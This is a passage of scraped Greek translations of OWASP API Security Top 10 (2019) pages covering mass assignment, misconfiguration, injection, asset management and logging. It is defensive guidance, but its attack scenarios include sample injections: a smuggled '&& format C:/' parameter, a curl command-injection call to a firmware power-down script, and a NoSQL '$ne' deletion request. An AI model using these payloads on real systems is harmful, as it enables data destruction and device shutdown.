/api/v1/videos/{video_id}/meta_data` επιστρέφει ένα αντικείμενο JSON με τις ιδιότητες του βίντεο. Μία από τις ιδιότητες είναι `\"mp4_conversion_params\":\"-v codec h264\"`, που υποδεικνύει ότι η εφαρμογή χρησιμοποιεί μια εντολή shell για τη μετατροπή του βίντεο.\n\nΟ εισβολέας διαπίστωσε επίσης ότι το τελικό σημείο προορισμού `POST /api/v1/videos/new` είναι ευάλωτο σε μαζική εκχώρηση (Mass Assignment) και επιτρέπει στην εφαρμογή-πελάτη (client) να ορίσει οποιαδήποτε ιδιότητα του αντικειμένου βίντεο.\nΟ εισβολέας ορίζει μια κακόβουλη τιμή ως εξής:\n`\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. Αυτή η τιμή θα προκαλέσει μια έγχυση εντολής shell (shell command injection) μόλις ο εισβολέας κατεβάσει το βίντεο ως MP4.\n\n## Τρόπος Πρόληψης\n\n* Εάν είναι δυνατόν, αποφύγετε τη χρήση συναρτήσεων που μετατρέπουν αυτόματα την είσοδο μιας εφαρμογής-πελάτη σε μεταβλητές κώδικα ή σε εσωτερικά αντικείμενα.\n* Δημιουργήστε μια λίστα επιτρεπόμενων (whitelist) ιδιοτήτων που να περιλαμβάνει μόνο τις ιδιότητες που επιτρέπεται να ενημερώνονται από τους χρήστες / εφαρμογές-πελάτες (API clients).\n* Χρησιμοποιήστε ενσωματωμένες δυνατότητες του framework σας για να δημιουργήσετε μια λίστα μη-επιτρεπόμενων ιδιοτήτων στις οποίες δεν πρέπει να έχουν πρόσβαση οι εφαρμογές-πελάτες (API clients).\n* Εάν είναι εφικτό, ορίστε και επιβάλλετε ρητά σχήματα (schemas) για τα payloads δεδομένων εισόδου.\n\n## Αναφορές (References)\n\n### Εξωτερικές Αναφορές\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:23.549182"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa7-security-misconfiguration.md", "content": "# API7:2019 Security Misconfiguration\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **3** | Επικράτηση (Prevalence) **3** : Ανιχνευσιμότητα **3** | Τεχνικές Επιπτώσεις **2** : Εξαρτώνται από την Επιχείρηση |\n| Οι εισβολείς συχνά επιχειρούν να βρουν μη επιδιορθωμένα ελαττώματα (unpatched flows), συνηθισμένα τελικά σημεία προορισμού ή μη προστατευμένα αρχεία και καταλόγους για να αποκτήσουν μη εξουσιοδοτημένη πρόσβαση ή γνώση του συστήματος. | Λανθασμένες ρυθμίσεις παραμέτρων ασφαλείας (Security Misconfigurations) μπορούν να υπάρξουν σε οποιοδήποτε επίπεδο της στοίβας API (API stack), από το επίπεδο δικτύου έως το επίπεδο εφαρμογής. Διατίθενται αυτοματοποιημένα εργαλεία για τον εντοπισμό και την εκμετάλλευση εσφαλμένων διαμορφώσεων, όπως περιττές υπηρεσίες ή ρυθμίσεις παλαιού τύπου (legacy options). | Οι εσφαλμένες ρυθμίσεις ασφαλείας όχι μόνο εκθέτουν ευαίσθητα δεδομένα χρηστών, αλλά εκθέτουν και λεπτομέρειες συστήματος που μπορεί να οδηγήσουν σε πλήρη παραβίαση του διακομιστή (server). |\n\n## Πότε το API είναι ευάλωτο\n\nΤο API μπορεί να είναι ευάλωτο όταν:\n\n* Δεν υπάρχει η κατάλληλη θωράκιση ασφαλείας (security hardening) σε όλα τα τμήματα της στοίβας της εφαρμογής, ή υπάρχουν λανθασμένες ρυθμίσεις δικαιωμάτων σε υπηρεσίες Cloud.\n* Δεν έχουν εγκατασταθεί οι ενημερωμένες εκδόσεις ασφαλείας, ή τα συστήματα είναι παροχημένα.\n* Αχρείαστα χαρακτηριστικά (features) είναι ενεργοποιημένα (για παράδειγμα, το API δέχεται HTTP verbs που δεν χρησιμοποιούνται).\n* Δεν υπάρχει Transport Layer Security (TLS).\n* Δεν στέλνονται στις εφαρμογές-πελάτες (clients) οι οδηγίες ασφαλείας (security directives)(π.χ., [Επικεφαλίδες Ασφαλείας][1]).\n* Δεν υπάρχει πολιτική Cross-Origin Resource Sharing (CORS) ή έχει ρυθμιστεί εσφαλμένα.\n* Τα μηνύματα σφαλμάτων περιλαμβάνουν τεχνικές πληροφορίες για τα σφάλματα όπως τα ονόματα και την αλληλουχία των μεθόδων εκτέλεσης (stack trace) ή το API εκθέτει άλλες ευαίσθητες πληροφορίες.\n\n## Παραδείγματα από Σενάρια Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΈνας εισβολέας βρίσκει το αρχείο `.bash_history` κάτω από τον κεντρικό φάκελο (root folder)\nτου διακομιστή, το οποίο περιλαμβάνει εντολές που χρησιμοποιούνται από την ομάδα DevOps για να έχουν πρόσβαση στο API:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\nΈνας εισβολέας θα μπορούσε επίσης να βρει άγνωστα τελικά σημεία προορισμού του API που\nχρησιμοποιούνται μόνο απο την ομάδα DevOps και τα οποία δεν είναι τεκμηριωμένα.\n\n### Σενάριο Επίθεσης #2\n\nΘέτοντας ως στόχο μια συγκεκριμένη υπηρεσία, ένας εισβολέας χρησιμοποιεί μια δημοφιλή μηχανή αναζήτησης για να αναζητήσει\nυπολογιστές άμεσα προσβάσιμους από το Διαδίκτυο. Ο εισβολέας βρίσκει έναν διακομιστή που τρέχει ένα δημοφιλές σύστημα\nδιαχείρισης βάσεων δεδομένων, το οποίο ακούει στην προεπιλεγμένη θύρα.\nΟ διακομιστής αυτός χρησιμοποιεί τις προεπιλεγμένες ρυθμίσεις (default configuration), οι οποίες έχουν απενεργοποιημένο\nτον έλεγχο ταυτότητας, με αποτέλεσμα ο εισβολέας να αποκτήσει πρόσβαση σε εκατομμύρια εγγραφές με προσωπικά δεδομένα (PII),\nπροσωπικές προτιμήσεις και δεδομένα ελέγχου ταυτότητας.\n\n### Σενάριο Επίθεσης #3\n\nΕπιθεωρώντας την μεταφορά των δεδομένων μιας εφαρμογής για κινητά, \nένας εισβολέας ανακαλύπτει ότι τα δεδομένα HTTP δεν μεταφέρονται ολικά κάτω από ένα ασφαλές πρωτόκολλο (π.χ. TLS).\nΟ εισβολέας ανακαλύπτει ότι αυτό συμβαίνει ειδικά για τη λήψη εικόνων προφίλ. \nΚαθώς η αλληλεπίδραση του χρήστη με το API είναι δυαδική και παρά το γεγονός ότι η μεταφορά των δυαδικών δεδομένων του API εκτελείται κάτω από ένα ασφαλές πρωτόκολλο, ο εισβολέας ανακαλύπτει ένα μοτίβο όσον αφορά το μέγεθος των απαντήσεων του API. Στην συνέχεια, ο εισβολέας χρησιμοποιεί το μοτίβο για να βγάζει συμπεράσματα για τις προτιμήσεις των χρηστών σε σχέση με το περιεχόμενο που εμφανίζεται (π.χ. εικόνες προφίλ).\n\n## Τρόπος Πρόληψης\n\nΜε στόχο την αποτελεσματική πρόληψη, ο κύκλος ζωής των API θα πρέπει να περιλαμβάνει τα παρακάτω:\n\n* Επαναλαμβανόμενη διαδικασία θωράκισης (hardening) που επιτρέπει γρήγορη \nκαι εύκολη εγκατάσταση ενός σωστά ασφαλισμένου περιβάλλοντος στο οποίο θα τρέχουν τα APIs.\n* Έλεγχο και ενημέρωση των ρυθμίσεων σε ολόκληρη τη στοίβα (stack) των APIs. Ο έλεγχος θα πρέπει να περιλαμβάνει αρχεία που χρησιμοποιούνται κατά την ενορχήστρωση (orchestration), API components και υπηρεσίες cloud (π.χ. δικαιώματα κάδων S3).\n* Ένα ασφαλές κανάλι επικοινωνίας για όλες τις αλληλεπιδράσεις του API σε στατικά στοιχεία (π.χ. εικόνες).\n* Αυτοματοποιημένη διαδικασία για τη συνεχή αξιολόγηση της αποτελεσματικότητας των ρυθμίσεων σε όλα τα περιβάλλοντα.\n\nΑκόμα:\n\n* Για να αποτρέψετε την πιθανή αποστολή τεχνικών πληροφοριών σε μηνύματα σφαλμάτων (exception trace) και άλλων πολύτιμων πληροφοριών στους εισβολείς,\nεάν έχετε την δυνατότητα, ορίστε και επιβάλετε συγκρεκριμένα σχήματα απαντήσεων API (response payload schemas), συμπεριλαμβανομένων των απαντήσεων σφαλμάτων (error responses).\n* Βεβαιωθείτε ότι το API είναι προσβάσιμο μόνο από τα ρήματα/μεθόδους HTTP (HTTP verbs) που έχετε καθορίσει.\nΌλα τα άλλα ρήματα/μέθοδοι HTTP (HTTP verbs) θα πρέπει να είναι απενεργοποιημένα (π.χ. \"HEAD\").\n* Τα APIs που είναι σχεδιασμένα για να είναι προσβάσιμα από εφαρμογές-πελάτες μέσω προγραμμάτων περιήγησης (π.χ., το front-end μιας εφαρμογής Web) θα πρέπει να εφαρμόζουν μια σωστή πολιτική κοινής χρήσης πόρων μεταξύ προέλευσης (CORS).\n\n## Αναφορές (References)\n\n### Αναφορές OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### Εξωτερικές Αναφορές\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:23.663468"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa8-injection.md", "content": "# API8:2019 Injection\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **3** | Επικράτηση (Prevalence)  **2** : Ανιχνευσιμότητα **3** | Τεχνικές Επιπτώσεις **3** : Εξαρτώνται από την Επιχείρηση |\n| Οι εισβολείς εισάγουν στο API κακόβουλα δεδομένα μέσω οποιασδήποτε διαθέσιμης μεθόδου εισαγωγής δεδομένων αναμένοντας να σταλούν τελικώς σε έναν διερμηνέα λογισμικού (interpreter). Οι μέθοδοι αυτοί που μπορούν να χρησιμοποιηθούν για εισαγωγή κακόβουλων δεδομένων που καταλήγουν σε διερμηνείς λογισμικού ονομάζονται διανύσματα έγχυσης (injection vectors). Παραδείγματα τέτοιων μεθόδων είναι η άμεση εισαγωγή δεδομένων (direct input), οι παράμετροι (parameters), οι ολοκληρωμένες/ενσωματωμένες υπηρεσίες (integrated services) κ.λπ. | Οι ευπάθειες έγχυσης είναι πολύ κοινές και εντοπίζονται συχνά σε ερωτήματα SQL, LDAP ή NoSQL, εντολές λειτουργικού συστήματος, αναλυτές XML και ORM. Αυτές οι ευπάθειες είναι εύκολο να εντοπιστούν κατά τον έλεγχο του πηγαίου κώδικα. Οι επιτιθέμενοι μπορούν να χρησιμοποιήσουν σαρωτές και fuzzers για να εντοπίσουν τέτοιες ευπάθειες. | Η έγχυση (injection) μπορεί να οδηγήσει σε αποκάλυψη πληροφοριών και απώλεια δεδομένων. Μπορεί επίσης να οδηγήσει σε επιθέσεις άρνησης εξυπηρέτησης (DoS) ή πλήρη κατάληψη του κεντρικού υπολογιστή. |\n\n## Πότε το API είναι ευάλωτο\n\nΤο API είναι ευάλωτο σε ευπάθεια έγχυσης (injection flaw) όταν:\n\n* Τα δεδομένα που παρέχονται από τους χρήστες ή εφαρμογές-πελάτες δεν επικυρώνονται, δεν φιλτράρονται ή δεν απολυμαίνονται (sanitized) από το API.\n* Τα δεδομένα που παρέχονται από τους χρήστες ή εφαρμογές-πελάτες χρησιμοποιούνται απευθείας ή συνδέονται με ερωτήματα SQL/NoSQL/LDAP, εντολές λειτουργικού συστήματος, αναλυτές XML και σχεσιακή αντιστοίχιση αντικειμένων (ORM) / χαρτογράφηση εγγράφων αντικειμένου (ODM).\n* Τα δεδομένα που προέρχονται από εξωτερικά συστήματα (π.χ. ολοκληρωμένα/ενσωματωμένα συστήματα) δεν επικυρώνονται (validation), δεν φιλτράρονται (filtering) ή δεν απολυμαίνονται (sanitization) από το API.\n\n## Παραδείγματα από Σενάρια Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΤο υλικολογισμικό (firmware) μιας συσκευής γονικού ελέγχου παρέχει το τελικό σημείο προορισμού `/api/CONFIG/restore` το οποίο έχει σχεδιαστεί έτσι ώστε η παράμετρος `appId` να αποστέλεται ως παράμετρος πολλαπλών τμημάτων (multipart parameter). \nΧρησιμοποιώντας έναν απομεταγλωττιστή (decompiler), ένας εισβολέας ανακαλύπτει ότι το `appId` περνάει απευθείας σε μια κλήση συστήματος χωρίς καμία απολύμανση (sanitization):\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nΗ ακόλουθη εντολή επιτρέπει στον εισβολέα να τερματίσει οποιαδήποτε συσκευή με το ίδιο ευάλωτο υλικολογισμικό:\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### Σενάριο Επίθεσης #2\n\nΈχουμε μια εφαρμογή με βασική λειτουργικότητα CRUD για λειτουργίες με κρατήσεις (bookings). \nΈνας εισβολέας κατάφερε να αναγνωρίσει ότι η εισαγωγή NoSQL μπορεί να είναι δυνατή μέσω της παραμέτρου ερωτήματος `bookingId` στο αίτημα διαγραφής κράτησης. To αίτημα είναι το εξής: `DELETE /api/bookings?bookingId=678`.\n\nΟ διακομιστής API χρησιμοποιεί την ακόλουθη λειτουργία (function) για να χειριστεί αιτήματα διαγραφής:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nΟ εισβολέας υπέκλεψε το αίτημα και άλλαξε την παράμετρο ερωτήματος `bookingId`, όπως φαίνεται παρακάτω. Σε αυτήν την περίπτωση, ο εισβολέας κατάφερε να διαγράψει την κράτηση άλλου χρήστη:\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## Τρόπος Πρόληψης\n\nΗ πρόληψη της έγχυσης απαιτεί τη διατήρηση των δεδομένων ξεχωριστά από εντολές και ερωτήματα.\n\n* Εκτελέστε επικύρωση (validation) δεδομένων χρησιμοποιώντας μια αξιόπιστη και ενεργά συντηρούμενη βιβλιοθήκη.\n* Όλα τα δεδομένα που παρέχονται από τους χρήστες ή εφαρμογές-πελάτες ή άλλα δεδομένα που προέρχονται από ενσωματωμένα συστήματα πρέπει να επικυρώνονται (validation), φιλτράρονται ή/και να απολυμαίνονται (sanitization).\n* Οι ειδικοί χαρακτήρες θα πρέπει να διαφεύγονται (escape) χρησιμοποιώντας τη συγκεκριμένη σύνταξη του διερμηνέα λογισμικού που λαμβάνει τα δεδομένα.\n* Προτιμήστε ένα ασφαλές API που παρέχει μια παραμετροποιημένη διεπαφή.\n* Φροντίστε να περιορίσετε τον αριθμό των επιστρεφόμενων εγγραφών για να αποτρέψετε τη μαζική παραβίαση δεδομένων σε περίπτωση επίθεσης.\n* Επικυρώστε τα εισερχόμενα δεδομένα χρησιμοποιώντας επαρκή φίλτρα για να επιτρέπονται μόνο έγκυρες τιμές για κάθε παράμετρο εισόδου.\n* Ορίστε τύπους δεδομένων και αυστηρά μοτίβα για όλες τις παραμέτρους αιτημάτων.\n\n## Αναφορές (References)\n\n### Αναφορές OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### Εξωτερικές Αναφορές\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:23.871664"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa9-improper-assets-management.md", "content": "# API9:2019 Improper Assets Management\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **3** | Επικράτηση (Prevalence) **3** : Ανιχνευσιμότητα **2** | Τεχνικές Επιπτώσεις **2** : Εξαρτώνται από την Επιχείρηση |\n| Οι παλιές εκδόσεις ενός API μένουν συνήθως ανενημέρωτες από ενημερώσεις ασφαλείας (unpatched) και έτσι αποτελούν έναν εύκολο τρόπο για την παραβίαση συστημάτων χωρίς να χρειάζεται ο εισβολέας να αντιμετωπίσει μηχανισμούς ασφαλείας τελευταίας τεχνολογίας, οι οποίοι μπορεί να υπάρχουν αλλά να προστατεύουν μόνο τις νέες εκδόσεις ενός API. | Η μη ενημερωμένη τεκμηρίωση (documentation) ενός API καθιστά πιο δύσκολη την εύρεση ή/και τη διόρθωση ευπαθειών. Η έλλειψη μεθοδικής καταγραφής των πληροφοριακών στοιχείων (assets inventory) και η έλλειψη στρατηγικών απόσυρσης (retire strategies) οδηγούν στο να τρέχουν ανενημέρωτα (unpatched) συστήματα, με αποτέλεσμα τη διαρροή ευαίσθητων δεδομένων. Είναι σύνηθες να βρίσκουμε άσκοπα εκτεθειμένους κεντρικούς υπολογιστές API λόγω των σύγχρονων concepts όπως τα microservices, τα οποία καθιστούν τις εφαρμογές ανεξάρτητες και εύκολες στην ανάπτυξη (π.χ. υπολογιστικό νέφος (cloud), k8s). | Οι εισβολείς ενδέχεται να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα ή ακόμη και πάρουν τον έλεγχο του διακομιστή μέσω παλιών, μη ενημερωμένων εκδόσεων API που συνδέονται στην ίδια βάση δεδομένων. |\n\n## Πότε το API είναι ευάλωτο\n\nΤο API ίσως είναι ευάλωτο όταν:\n\n* Ο σκοπός ενός κεντρικού υπολογιστή API είναι ασαφής και δεν υπάρχουν σαφείς απαντήσεις στις ακόλουθες ερωτήσεις:\n    * Σε ποιο περιβάλλον εκτελείται το API (π.χ. παραγωγή (production), σταδιοποίηση (staging), δοκιμή (test), ανάπτυξη (development));\n    * Ποιος πρέπει να έχει δικτυακή πρόσβαση στο API (π.χ. δημόσια πρόσβαση, εσωτερική πρόσβαση, πρόσβαση σε συνεργάτες);\n    * Ποια έκδοση API εκτελείται;\n    * Ποια δεδομένα συλλέγονται και επεξεργάζονται από το API (π.χ. Προσωπικά αναγνωρίσιμα στοιχεία (PII));\n    * Ποια είναι η ροή των δεδομένων;\n* Δεν υπάρχει τεκμηρίωση (documentation) ή η υπάρχουσα τεκμηρίωση δεν έχει ενημερωθεί.\n* Δεν υπάρχει σχέδιο απόσυρσης (retirement plan) για κάθε έκδοση API.\n* Δεν υπάρχει αρχείο καταγραφής όλων των hosts (hosts inventory) ή αν υπάρχει δεν είναι ενημερωμένο.\n* Το αρχείο καταγραφής ολοκληρωμένων υπηρεσιών (integrated services inventory), είτε της εταιρίας που φτιάχνει το API (first-party), είτε τρίτων μελών (third-party), λείπει ή είναι παλιό.\n* Εκτελούνται παλιές ή προηγούμενες εκδόσεις του API χωρίς ενημέρωση.\n\n## Παραδείγματα Σεναρίων Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΜετά τον επανασχεδιασμό των εφαρμογών της, μια τοπική υπηρεσία αναζήτησης άφησε μια \nπαλιά έκδοση API (`api.someservice.com/v1`) σε λειτουργία, απροστάτευτη και με \nπρόσβαση στη βάση δεδομένων των χρηστών. Ένας εισβολέας, ενώ στόχευε μία από τις πιο πρόσφατες \nεφαρμογές που κυκλοφόρησαν, βρήκε τη διεύθυνση API (`api.someservice.com/v2`). \nΗ αντικατάσταση του «v2» με το «v1» στη διεύθυνση URL έδωσε στον εισβολέα πρόσβαση στο παλιό,\nμη προστατευμένο API, εκθέτοντας τα προσωπικά στοιχεία ταυτοποίησης (PII) περισσότερων από 100 εκατομμυρίων χρηστών.\n\n### Σενάριο Επίθεσης #2\n\nΈνα κοινωνικό δίκτυο εφάρμοσε έναν μηχανισμό περιορισμού ρυθμού (rate limiting) που εμποδίζει \nτους εισβολείς να χρησιμοποιούν επιθέσεις ωμής βίας (brute force attacks) για να μαντέψουν τα \nδιακριτικά επαναφοράς κωδικών πρόσβασης. Αυτός ο μηχανισμός δεν εφαρμόστηκε ως μέρος του ίδιου \nτου κώδικα API, αλλά σε ένα ξεχωριστό στοιχείο (component) μεταξύ του πελάτη και του επίσημου API («www.socialnetwork.com»).\nΈνας ερευνητής βρήκε έναν δεύτερο κεντρικό υπολογιστή («www.mbasic.beta.socialnetwork.com») που εκτελεί το ίδιο API, συμπεριλαμβανομένου του μηχανισμού επαναφοράς κωδικού πρόσβασης, \nαλλά χωρίς μηχανισμό περιορισμού ρυθμού. Ο ερευνητής μπόρεσε να επαναφέρει τον κωδικό πρόσβασης\nοποιουδήποτε χρήστη χρησιμοποιώντας μια απλή επίθεση ωμής βίας για να μαντέψει το διακριτικό των 6 ψηφίων.\n\n## Τρόπος Πρόληψης\n\n* Καταγράψτε όλους τους υπολογιστές (hosts) που φιλοξενούν API. Καταγράψτε τα περιβάλλοντα που τρέχουν τα API (production, staging, test, development). \nΕπίσης καταγράψτε ποιος θα πρέπει να έχει πρόσβαση σε αυτά (ανοιχτά σε όλους, εσωτερική πρόσβαση, πρόσβαση σε συνεργάτες) καθώς και την έκδοση τους.\n* Καταγράψτε τις ολοκληρωμένες υπηρεσίες (integrated services) δηλαδή τις εξωτερικές υπηρεσίες που χρησιμοποιούν το API. Τεκμηριώστε σημαντικές πτυχές τους όπως ο ρόλος τους στο σύστημα, ποια δεδομένα ανταλλάσσονται (ροή δεδομένων) και η ευαισθησία τους.\n* Τεκμηριώστε όλες τις πτυχές του API σας, όπως τον έλεγχο ταυτότητας, τα σφάλματα, τις ανακατευθύνσεις, τον περιορισμό ρυθμού, την πολιτική και τα τελικά σημεία κοινής χρήσης πόρων μεταξύ προέλευσης (CORS), συμπεριλαμβανομένων των παραμέτρων, των αιτημάτων και των απαντήσεών τους.\n* Δημιουργήστε τεκμηρίωση αυτόματα υιοθετώντας ανοιχτά πρότυπα (open standards). Συμπεριλάβετε την αυτόματη δημιουργία τεκμηρίωσης στο σύστημα CI/CD σας.\n* Παραχωρήστε πρόσβαση στην τεκμηρίωση API σε όσους είναι εξουσιοδοτημένοι να χρησιμοποιούν το API.\n* Χρησιμοποιήστε εξωτερικά μέτρα προστασίας, όπως τείχη προστασίας ασφαλείας API για όλες τις εκτεθειμένες εκδόσεις των API σας και όχι μόνο για την τρέχουσα έκδοση παραγωγής.\n* Αποφύγετε τη χρήση δεδομένων παραγωγής σε μη παραγωγικές διανομές (deployments) του API. Εάν αυτό είναι αναπόφευκτο, αυτά τα τελικά σημεία προορισμού θα πρέπει να τυγχάνουν της ίδιας μεταχείρισης ασφαλείας με αυτά της παραγωγής.\n* Όταν νεότερες εκδόσεις των API περιλαμβάνουν βελτιώσεις ασφαλείας, πραγματοποιήστε ανάλυση κινδύνου για να αποφασίσετε για τις ενέργειες μετριασμού που απαιτούνται για τις παλαιότερες εκδόσεις: για παράδειγμα, εάν είναι δυνατή η υποστήριξη των βελτιώσεων χωρίς να διαταραχθεί η συμβατότητα API ή εάν πρέπει να αφαιρέσετε τις παλαιότερες εκδόσεις γρήγορα και να αναγκάσετε όλους τους χρήστες / εφαρμογές-πελάτες να μετακινηθούν στην πιο πρόσφατη έκδοση.\n\n## Αναφορές (References)\n\n### Εξωτερικές Αναφορές\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:23.979017"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Insufficient Logging & Monitoring\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **2** | Επικράτηση (Prevalence) **3** : Ανιχνευσιμότητα **1** | Τεχνικές Επιπτώσεις **2** : Εξαρτώνται από την Επιχείρηση |\n| Οι επιτιθέμενοι εκμεταλλεύονται την έλλειψη καταγραφής συμβάντων (logging) και παρακολούθησης (monitoring) για να επιτεθούν σε συστήματα χωρίς να γίνουν αντιληπτοί. | Χωρίς καταγραφή και παρακολούθηση ή με ανεπαρκή καταγραφή και παρακολούθηση, είναι σχεδόν αδύνατο να παρακολουθήσετε ύποπτες δραστηριότητες και να αντιδράσετε έγκαιρα. | Χωρίς ορατότητα σε συνεχείς κακόβουλες δραστηριότητες, οι εισβολείς έχουν άφθονο χρόνο για να υπονομεύσουν πλήρως τα συστήματα σας. |\n\n## Πότε το API είναι ευάλωτο\n\nΤο API είναι ευάλωτο όταν:\n\n* Δεν παράγει κανένα αρχείο καταγραφής συμβάντων, το επίπεδο καταγραφής δεν έχει ρυθμιστεί σωστά ή τα μηνύματα καταγραφής δεν περιλαμβάνουν αρκετές λεπτομέρειες.\n* Η ακεραιότητα των μηνυμάτων καταγραφής δεν είναι εγγυημένη (π.χ. [Log Injection][1]).\n* Τα αρχεία καταγραφής δεν παρακολουθούνται συνεχώς.\n* Η υποδομή API δεν παρακολουθείται συνεχώς.\n\n## Παραδείγματα από Σενάρια Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΤα κλειδιά πρόσβασης ενός διαχειριστικού API διέρρευσαν σε ένα δημόσια προσβάσιμο χώρο αποθήκευσης κώδικα (αποθετήριο) (public repository).\nΟ κάτοχος του αποθετηρίου ειδοποιήθηκε μέσω email σχετικά με την πιθανή διαρροή, \nαλλά χρειάστηκαν περισσότερες από 48 ώρες για να αντιμετωπιστεί το συμβάν και η έκθεση των κλειδιών πρόσβασης μπορεί να επέτρεψε την πρόσβαση σε ευαίσθητα δεδομένα. Λόγω ανεπαρκούς καταγραφής, η εταιρεία δεν είναι σε θέση να αξιολογήσει σε ποια δεδομένα είχαν πρόσβαση κακόβουλοι παράγοντες.\n\n### Σενάριο Επίθεσης #2\n\nΜια πλατφόρμα κοινής χρήσης βίντεο χτυπήθηκε από μια «μεγάλης κλίμακας» επίθεση τροφοδότησης διαπιστευτηρίων (credential stuffing). \nΠαρά το γεγονός ότι αποτυχημένες προσπάθειες σύνδεσης καταγράφηκαν στα αρχεία καταγραφής συμβάντων, δεν στάλθηκαν ειδοποιήσεις ασφαλείας κατά τη διάρκεια του χρόνου της επίθεσης. Έπειτα από παράπονα χρηστών, τα αρχεία καταγραφής συμβάντων του API αναλύθηκαν και η επίθεση εντοπίστηκε.\nΗ εταιρεία αναγκάστηκε να αναφέρει το περιστατικό στις ρυθμιστικές αρχές και να κάνει μια δημόσια ανακοίνωση ζητώντας από τους χρήστες να επαναφέρουν τους κωδικούς πρόσβασής τους.\n\n## Τρόπος Πρόληψης\n\n* Καταγράψτε όλες τις αποτυχημένες προσπάθειες ελέγχου ταυτότητας, την άρνηση πρόσβασης και τα σφάλματα επικύρωσης εισαγωγής (input validation errors).\n* Τα αρχεία καταγραφής πρέπει να συντάσσονται χρησιμοποιώντας μια μορφή κατάλληλη για αξιοποίηση από μια εφαρμογή διαχείρισης αρχείων καταγραφής συμβάντων (log management solution) και θα πρέπει να περιλαμβάνουν αρκετές λεπτομέρειες για τον εντοπισμό του κακόβουλου παράγοντα.\n* Τα αρχεία καταγραφής θα πρέπει να αντιμετωπίζονται ως ευαίσθητα δεδομένα και η ακεραιότητά τους θα πρέπει να είναι εγγυημένη κατά την αποθήκευση και τη μεταφορά.\n* Χρησιμοποιήστε ένα σύστημα παρακολούθησης (monitoring system) για συνεχή παρακολούθηση της υποδομής, του δικτύου και της λειτουργίας των APIs.\n* Χρησιμοποιήστε ένα σύστημα διαχείρισης πληροφοριών ασφαλείας και συμβάντων 